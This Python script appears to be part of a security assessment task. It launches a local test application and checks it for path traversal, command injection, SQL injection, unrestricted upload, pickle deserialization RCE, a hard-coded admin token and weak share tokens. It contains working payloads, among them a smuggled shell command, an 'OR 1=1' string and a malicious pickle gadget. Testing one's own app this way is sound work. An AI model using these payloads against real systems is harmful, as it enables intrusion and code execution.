#!/usr/bin/env python3
"""Dynamic tests against vaultapp (stand-in for Question 1). Writes evidence/dynamic_results.json"""
import json, os, pickle, subprocess, sys, time, urllib.request, urllib.error, urllib.parse

HERE = os.path.dirname(os.path.abspath(__file__))
PORT = 8765
BASE = f"http://127.0.0.1:{PORT}"
results = {}

def req(method, path, data=None, headers=None):
    r = urllib.request.Request(BASE + path, data=data, method=method, headers=headers or {})
    try:
        with urllib.request.urlopen(r, timeout=5) as resp:
            return resp.status, resp.read(), dict(resp.headers)
    except urllib.error.HTTPError as e:
        return e.code, e.read(), dict(e.headers)

srv = subprocess.Popen([sys.executable, os.path.join(HERE, "vaultapp", "app.py"), str(PORT)])
time.sleep(1.2)
try:
    # D1 path traversal read
    s, b, _ = req("GET", "/download?file=" + urllib.parse.quote("../app.py"))
    results["D1_path_traversal_read"] = {"status": s, "confirmed": s == 200 and b"vaultapp" in b, "evidence": b[:60].decode(errors="replace")}
    # D2 command injection
    marker = os.path.join(HERE, "evidence", "pwned.txt")
    if os.path.exists(marker): os.remove(marker)
    payload = "x; echo INJECTED > " + marker
    req("GET", "/info?file=" + urllib.parse.quote(payload))
    results["D2_command_injection"] = {"confirmed": os.path.exists(marker), "evidence": "marker file created by injected command" if os.path.exists(marker) else "no marker"}
    # D3 SQL injection
    req("POST", "/upload?name=a.txt&note=hello", b"data")
    s, b, _ = req("GET", "/search?q=" + urllib.parse.quote("zzz%' OR 1=1 --"))
    results["D3_sql_injection"] = {"status": s, "confirmed": b"a.txt" in b, "evidence": b.decode()[:80]}
    # D4 unrestricted upload (script extension + traversal in name)
    s, _, h = req("POST", "/upload?name=" + urllib.parse.quote("shell.php"), b"<?php ?>")
    s2, _, _ = req("POST", "/upload?name=" + urllib.parse.quote("../traversal_upload.txt"), b"x")
    results["D4_unrestricted_upload"] = {"php_status": s, "traversal_write_status": s2,
        "confirmed": s == 201 and os.path.exists(os.path.join(HERE, "vaultapp", "traversal_upload.txt"))}
    # D5 insecure deserialization (RCE via pickle)
    marker2 = os.path.join(HERE, "evidence", "pickle_rce.txt")
    if os.path.exists(marker2): os.remove(marker2)
    class Evil:
        def __reduce__(self):
            return (os.system, ("echo PICKLED > " + marker2,))
    s, b, _ = req("POST", "/import", pickle.dumps(Evil()), {"X-Admin-Token": "vault-admin-2024-secret"})
    results["D5_pickle_rce"] = {"status": s, "confirmed": os.path.exists(marker2), "note": "requires admin token, which is hard-coded in source"}
    # D6 hard-coded token usable: wrong token rejected, source token accepted
    s_bad, _, _ = req("POST", "/import", b"x", {"X-Admin-Token": "wrong"})
    results["D6_hardcoded_secret"] = {"wrong_token_status": s_bad, "source_token_status": s, "confirmed": s_bad == 403 and s == 200}
    # D7 weak share tokens: sample for charset/length only
    toks = [req("GET", "/share")[1].decode() for _ in range(5)]
    results["D7_weak_prng_tokens"] = {"sample": toks, "confirmed": False, "note": "format observable; predictability needs seed analysis, not tested"}
finally:
    srv.terminate()
    for f in ("traversal_upload.txt",):
        p = os.path.join(HERE, "vaultapp", f)
        if os.path.exists(p): os.remove(p)
    shell = os.path.join(HERE, "vaultapp", "uploads", "shell.php")
    if os.path.exists(shell): os.remove(shell)

with open(os.path.join(HERE, "evidence", "dynamic_results.json"), "w") as f:
    json.dump(results, f, indent=2)
print(json.dumps(results, indent=2))
